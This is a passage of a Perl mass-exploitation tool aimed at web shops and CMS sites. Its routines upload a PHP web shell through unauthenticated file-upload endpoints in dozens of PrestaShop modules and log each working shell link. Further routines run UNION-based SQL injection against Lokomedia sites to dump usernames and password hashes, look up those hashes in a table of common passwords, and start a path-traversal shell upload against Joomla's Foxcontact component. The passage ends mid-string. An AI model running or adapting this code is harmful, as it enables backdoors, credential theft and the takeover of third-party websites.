print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $vtermslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$vtermslideshowup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/Xploit.php";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $simpleslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$simpleslideshowup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/Xploit.php";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $productpageadvertsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$productpageadvertsup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);
$homepageadvertiseup="$site/modules/homepageadvertise/slides/Xploit.php";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $homepageadvertiseup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$homepageadvertiseup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold red'),"NOT VULN\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/Xploit.php";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $homepageadvertise2up?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$homepageadvertise2up?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/Xploit.php";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $jro_homepageadvertiseup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$jro_homepageadvertiseup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold red'),"NOT VULN\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/Xploit.php";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $attributewizardproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$attributewizardproup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/Xploit.php";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $oneattributewizardproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$oneattributewizardproup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold red'),"NOT VULN\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/Xploit.php";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $attributewizardproOLDup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$attributewizardproOLDup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold red'),"NOT VULN\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Xploit.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/Xploit.php";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $attributewizardpro_xup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$attributewizardpro_xup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Xploit.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/Xploit.php.png";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $advancedsliderup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["Xploit.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/Xploit.php.png";
my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $cartabandonmentproup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["Xploit.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/Xploit.php.png";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/X Xploit/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $cartabandonmentproOldup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$cartabandonmentproOldup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold red'),"NOT VULN\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Xploit.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/Xploit.php.mp4";
my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/X Xploit/) {
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $videostabup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$videostabup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["Xploit.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/Xploit.php";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/X Xploit/) {
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wg24themeadministrationup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wg24themeadministrationup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold red'),"NOT VULN\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="Xploit.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/Xploit.php";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/X Xploit/) {
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $fieldvmegamenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$fieldvmegamenuup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["Xploit.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/Xploit.php";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/X Xploit/) {
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wdoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wdoptionpanelup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="Xploit.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/Xploit.php";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $pk_flexmenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$pk_flexmenuup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="Xploit.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/Xploit.php";
my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/X Xploit/) {
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $pk_vertflexmenuup?X=Xploit\n";

open (TEXT, '>>Result/shell.txt');
print TEXT "$pk_vertflexmenuup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/X Xploit/) {
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $nvn_export_ordersup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$nvn_export_ordersup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold red'),"NOT VULN\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=Xploit.php";
my $shell ="Xploit.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/Xploit.php.png";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/X Xploit/) {
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $megamenuup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$megamenuup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="Xploit.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/Xploit.php";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/X Xploit/) {
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $tdpsthemeoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$tdpsthemeoptionpanelup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="Xploit.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/Xploit.php";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/X Xploit/) {
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $psmodthemeoptionpanelup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$psmodthemeoptionpanelup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold red'),"NOT VULN\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="Xploit.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/Xploit.php";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/X Xploit/) {

print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $masseditproductup?X=Xploit\n\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$masseditproductup?X=Xploit\n";
close (TEXT);
}else{
print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN\n\n";
}
}


################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomedia1 = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold white'),"URL : $pathone\n\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n\n";
}
}





#######################################################################
#       _                           _       ______                    #
#      | |                         | |     |  ____|                   #
#      | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __          #
#  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \         #
# | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |        #
#  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/         #
#                                                      | |            #
#                                                      |_|            #
################ foxcontact ###########################################

################ Version #####################
sub versionn(){

my $url = "$site/language/en-GB/en-GB.xml";
my $checkomusersc = $ua->get("$url")->content;

if($checkomusersc =~/<version>(.*)</) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Joomla Version";
print color('bold white')," .................... ";
print color('bold white'),"";
print color('bold green'),"$1";
print color('bold white'),"\n";

open (TEXT, '>>Result/version.txt');
print TEXT "joom => $site => $1\n";
close (TEXT);
}
}

sub fox2(){

my @filesz = ('/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
print colored ("[ Scanning Foxcontact]",'green'),$url."\n";
my $checkfoxupx = $ua->get("$url")->content;
if ($checkfoxupx =~ /foxcontact/) {	
	my $regex='<a name="cid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
		my $regex='<a name="mid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
}
my @files = ('components/com_foxcontact/lib/file-uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php','index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id='.$1.'?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php','index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='.$1.'&cid='.$1.'&mid='.$1.'&owner=module&id='.$1.'&qqfile=/../../Xploit.php','components/com_foxcontact/lib/uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php');
OUTER: foreach my $vul(@files){
chomp $vul;
 my $izo = $site . $vul; 
my $indexa='
